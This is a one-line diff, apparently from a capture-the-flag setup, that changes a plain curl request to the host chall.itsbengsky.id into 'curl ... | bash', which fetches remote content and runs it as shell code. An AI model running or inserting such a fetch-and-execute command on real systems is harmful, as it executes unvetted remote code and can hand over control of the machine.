@@ -1,1 +1,2 @@
-curl http://chall.itsbengsky.id
+
+curl http://chall.itsbengsky.id | bash
